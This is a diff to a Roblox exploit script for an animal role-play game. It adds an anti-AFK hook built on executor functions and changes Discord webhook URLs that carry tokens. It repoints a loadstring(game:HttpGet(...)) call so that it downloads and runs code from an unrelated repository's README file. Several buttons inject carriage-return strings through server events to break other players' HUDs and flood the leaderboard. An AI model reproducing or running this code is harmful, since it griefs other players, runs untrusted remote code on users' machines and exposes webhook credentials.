@@ -38,7 +38,7 @@ Character = Player.Character or Player.CharacterAdded:Wait()
 
 --[username] = 'webhook'
 local Webhook = { -- For Grinding, tells you your leveling speed.
-    ["XelXel"] = 'https://discordapp.com/api/webhooks/1060646794977087518/FvsvsyQXHjSZKxspt3Xc-1dMRFEnfjG-tcu32uzqNZRi084YCLuhzIgSIUI_Nja_AMBE', -- Example Webhook, doesn't work.
+    ["XelXel"] = 'https://discord.com/api/webhooks/1852735481765/3IhmtR2PqI5zaoUGpzrfbfFDu2P0x0pbIs1KY5Zx_ZChzNoQ8LH', -- Example Webhook, doesn't work.
 }
 
 if Webhook[game.Players.LocalPlayer.Name] then
@@ -124,7 +124,8 @@ local BotPhotoURL = 'https://media.discordapp.net/attachments/856034478408728576
 local Red = tonumber(tostring("0xFF0000"))
 local Green = tonumber(tostring("0x32CD32"))
 local Timestamp = os.date("%Y-%m-%dT%X.000Z")
-local Request = 'https://discord.com/channels/1060645004424511608/1060645004424511611'
+local Request = http_request or request or HttpPost or syn.request
+
 
 
 
@@ -149,7 +150,7 @@ local LostExpPerMin = 0
 local xseconds = 0
 local xmins = 0
 
-if getgenv().LocalWebhookId ~= 'https://discordapp.com/api/webhooks/1060646794977087518/FvsvsyQXHjSZKxspt3Xc-1dMRFEnfjG-tcu32uzqNZRi084YCLuhzIgSIUI_Nja_AMBE' then
+if getgenv().LocalWebhookId ~= 'YOUR DISCORD WEBHOOK HERE' then
     local TrackingWebhookSeconds = 0
     local TrackingWebhookMinutes = 0
     local TrackedTime = 0
@@ -324,6 +325,37 @@ if getgenv().LocalWebhookId ~= 'https://discordapp.com/api/webhooks/106064679497
         end
     end)
 end
+
+-- [[ Anti AFK ]]
+if not game:IsLoaded() then game.Loaded:Wait(); end
+
+local idledEvent = game:GetService("Players").LocalPlayer.Idled
+local function disable()
+    for _, cn in ipairs(getconnections(idledEvent)) do
+        cn:Disable()
+    end
+end
+
+oldConnect = hookfunction(idledEvent.Connect, function(self, ...)
+    local cn = oldConnect(self, ...); disable()
+    return cn
+end)
+
+namecall = hookmetamethod(game, "__namecall", function(self, ...)
+    if self == idledEvent and getnamecallmethod() == "Connect" then
+        local cn = oldConnect(self, ...); disable()
+        return cn
+    end
+    return namecall(self, ...)
+end)
+
+disable()
+
+
+
+
+
+
 
 ---- KEEPS TRACK OF ALL THE EXP GAINED FROM THE USE OF THE CHANGED SIGNAL. THIS IS USED TO PREDICT WHAT LEVEL YOU WILL BE BASED ON THE GIVEN EXP PER MIN
 
@@ -809,13 +841,13 @@ Toggle = Section:CreateToggle('ONI Text [Animation]', false, Color3.fromRGB(0, 1
 end)
 
 local Animation
-Toggle = Section:CreateToggle('TeaSip [Animation]', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
+Toggle = Section:CreateToggle('C.N [Animation]', false, Color3.fromRGB(0, 125, 255), 0.25, function(Value)
     if Value == true then
         Animation = true
     else
         Animation = false
     end
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xen101/Roblox/main/Animal%20Simulator/Animations/Animation%20Tea%20Sip.lua",true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xpzrmodzz/test/main/README.md",true))()
 
     while Animation do
         wait()
@@ -875,7 +907,7 @@ local Textbox = Section:CreateTextbox('ONI Name Change', '', function(Value)
    -- end
 
 
-    endstring = " \r\n ".. Username
+    endstring = "	\r\n ".. Username
 
     game:GetService("Players").LocalPlayer.PlayerGui.RolePlayName.Frame.bodyFrame.submitBtn.nameEvent:FireServer(endstring)
 end)
@@ -893,8 +925,8 @@ Button = Section:CreateButton("Bug Everyone's HUD", function()
     game:GetService("Players").LocalPlayer.PlayerGui.RolePlayName.Frame.bodyFrame.submitBtn.nameEvent:FireServer(fullstring)
 end)
 
-Button = Section:CreateButton('Cover the Leaderboard with 😈AN😈', function()
-    local string = "\r\n 😈AN😈"
+Button = Section:CreateButton('Cover the Leaderboard with FRITE ON TOP', function()
+    local string = "\r\n FRITE ON TOP ?!"
     local fullstring = ""
     for i = 1, 75 do
         fullstring = fullstring .. string
@@ -1950,8 +1982,8 @@ end)
 TabMisc = Window:CreateTab('Pack Settings', false, 'rbxassetid://3926305904', Vector2.new(524, 44), Vector2.new(36, 36))
 Section = TabMisc:CreateSection('Pack Settings')
 
-Button = Section:CreateButton('Create AN pack', function()
-    game:GetService("Players").LocalPlayer.PlayerGui.TeamGUI.createFrame.bodyFrame.createButton.createTeamEvent:FireServer('😈AN😈')
+Button = Section:CreateButton('Create AN Pack', function()
+    game:GetService("Players").LocalPlayer.PlayerGui.TeamGUI.createFrame.bodyFrame.createButton.createTeamEvent:FireServer('AN')
 end)
 
 Button = Section:CreateButton('Create ONI Pack', function()
